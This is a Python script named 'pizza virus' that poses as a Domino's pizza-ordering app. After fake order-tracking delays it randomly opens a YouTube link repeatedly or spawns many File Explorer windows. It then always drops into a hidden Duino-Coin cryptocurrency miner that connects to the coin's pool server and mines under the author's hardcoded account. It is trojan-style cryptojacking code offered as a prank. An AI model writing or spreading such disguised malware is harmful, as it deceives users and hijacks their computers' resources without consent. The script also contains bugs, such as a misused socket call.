# pizza virus

#Global imports
import time
from datetime import datetime, timedelta
import random
import webbrowser
import os
import subprocess
import hashlib
import os
from socket import socket
import sys  # Only python3 included libraries
import time
from urllib.request import Request, urlopen
from json import loads



print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣤⣄⣄⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀")
print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⠊⠉⠉⠉⠉⠉⣩⡷⠋⠉⠹⡛⢽⠢⣀⣀⡀⠀")
print("⢀⣀⣤⣴⠶⣾⣿⡿⠯⠯⣍⣙⣒⣲⠶⠶⠶⡿⢴⠧⠷⠒⣿⣏⠡⡤⠤⠯⡆")
print("⣿⣶⣒⡒⠛⠽⢯⣥⣶⣯⠭⡵⢊⣩⣭⣲⡂⡗⠈⠉⠉⠉⠉⡇⣼⣷⣿⣧")
print("⣮⣍⣛⡛⠛⠛⠛⠛⠛⠘⡾⣴⣿⣿⣿⣿⣧⡇⠀⠀⠀⢀⣰⣠⡽⣿⣿⠟")
print("⠾⠿⣶⣦⣭⣍⣹⣷⡄⡸⣹⣿⡿⣿⣻⣿⡿⠷⠶⠟⠛⠛⠉⠉⠓⠻⠟")
print("⠀⠀⠀⠉⠉⠁⠉⠛⠛⠛⠳⠿⢿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
print("")
print("-----------------------------")
print("")
print("")
print(" Domino's Windows App!")
print("")
print("")
print("-----------------------------")
# just to break up my spaghetti code



print("")
print("What pizza would you like to order?")
print("")
print("Margarita Pizza: Simply topped with lots of melted mozzarella goodness.")
print("Pepperoni Pizza: A Domino's classic. Slices of crispy pepperoni & creamy mozzarella.")
print("Hawaiian Pizza: A classic pairing of smoky leg ham & sweet pineapple pieces.")
print("")
pizza_selection = input("What pizza would you like to order? (NAME OF PIZZA eg. Pepperoni): ")
time.sleep(2)
print("")
print("Okay, 1 large " + pizza_selection + " pizza!")
time.sleep(2)


DeliveryAddress = input("Please insert a Delivery Address: ")

print("")
print("Ok, Delivering to " + DeliveryAddress + " !")
time.sleep(10)
print("")
print("We have recieved your order. We'll begin your live tracking ASAP.")
# "live" tracker
time.sleep(1)
print("")
print("Connecting to Store...")
print("")
time.sleep(5)
print("Recieved!")
print("")
print("We are making your pizza right now...")
time.sleep(50)
print("")
print("Putting your pizza in the oven...")
time.sleep(75)
print("")
print("Boxing it up...")
time.sleep(10)
print("")
print("Beginning delivery to " + DeliveryAddress + ".")

# ETA Calculations
CT = datetime.now()
ETA = CT + timedelta(minutes=5)
STRETA = ETA.strftime("%H:%M")

print("Estimated Arrival Time: " + STRETA)
time.sleep(300)

punishment_gen = (random.randint(0,3))


if punishment_gen == 1:
    for _ in range(5):
     url = "https://www.youtube.com/watch?v=48rz8udZBmQ"
     webbrowser.open(url)
     print("imagine not knowing that this was a virus lol.")
     print("Ending 2: You are really are an idiot.")

if punishment_gen == 0:
    print("Unfortunately, we have had to cancel your order for one " + pizza_selection + " pizza.")
    print("Sorry for the incovenience, Domino's Team.")
    print("Ending 1: nothing happened. Lucky you.")


if punishment_gen == 2:
 for _ in range(10):
    if punishment_gen == 2:
        command_to_run = 'explorer'

        try:
            subprocess.run(command_to_run, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            filler = "filler"
 print("Have fun closing them file explorers! ;)")
 print("Ending 3: Dem files. Look at them go!")



punishment_gen = 3

if punishment_gen == 3:
    client_socket = socket.socket()

def current_time():
    t = time.localtime()
    current_time = time.strftime("%H:%M:%S", t)
    return current_time

username = "GamerzMinesCryptoForFun"
mining_key = "ButThatsJustATheoryAGameTheory"
diff_choice = "Y"
if diff_choice.lower() == "n":
    UseLowerDiff = False
else:
    UseLowerDiff = True

def fetch_pools():
    while True:
        try:
            response = loads(urlopen(Request("https://server.duinocoin.com/getPool")).read().decode())
            NODE_ADDRESS = response["ip"]
            NODE_PORT = response["port"]
            return NODE_ADDRESS, NODE_PORT
        except Exception as e:
            time.sleep(15)

while True:
    try:
        NODE_ADDRESS, NODE_PORT = fetch_pools()
    except Exception as e:
        NODE_ADDRESS = "server.duinocoin.com"
        NODE_PORT = 2813
    client_socket.connect((str(NODE_ADDRESS), int(NODE_PORT)))
    server_version = client_socket.recv(100).decode()

    # Mining section
    while True:
        if UseLowerDiff:
            # Send job request for lower diff
            client_socket.send(bytes(
                "JOB,"
                + str(username)
                + ",LOW,"
                + str(mining_key),
                encoding="utf8"))
        else:
            # Send job request
            client_socket.send(bytes(
                "JOB,"
                + str(username)
                + ",MEDIUM,"
                + str(mining_key),
                encoding="utf8"))

        # Receive work
        job = client_socket.recv(1024).decode().rstrip("\n")
        # Split received data to job and difficulty
        job = job.split(",")
        difficulty = job[2]

        hashingStartTime = time.time()
        base_hash = hashlib.sha1(str(job[0]).encode('ascii'))
        temp_hash = None

        for result in range(100 * int(difficulty) + 1):
            # Calculate hash with difficulty
            temp_hash = base_hash.copy()
            temp_hash.update(str(result).encode('ascii'))
            ducos1 = temp_hash.hexdigest()

            # If hash is even with expected hash result
            if job[1] == ducos1:
                hashingStopTime = time.time()
                timeDifference = hashingStopTime - hashingStartTime
                hashrate = result / timeDifference

                # Send numeric result to the server
                client_socket.send(bytes(
                    str(result)
                    + ","
                    + str(hashrate)
                    + ",Minimal_PC_Miner",
                    encoding="utf8"))

                # Get feedback about the result
                feedback = client_socket.recv(1024).decode().rstrip("\n")